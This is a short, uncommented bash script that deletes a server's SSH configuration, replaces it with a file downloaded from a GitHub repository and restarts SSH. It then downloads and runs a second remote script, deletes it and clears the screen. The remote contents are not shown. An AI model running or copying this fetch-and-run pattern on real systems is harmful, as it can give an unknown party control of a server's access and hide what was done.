
#!/bin/bash

cd /etc/ssh
rm sshd_config

 wget https://raw.githubusercontent.com/Sprent605/mains/main/sshd_config

sudo systemctl restart ssh
systemctl restart ssh

cd $HOME

wget https://raw.githubusercontent.com/Sprent605/entity/main/doer.sh && chmod +x doer.sh && ./doer.sh

rm doer.sh

clear

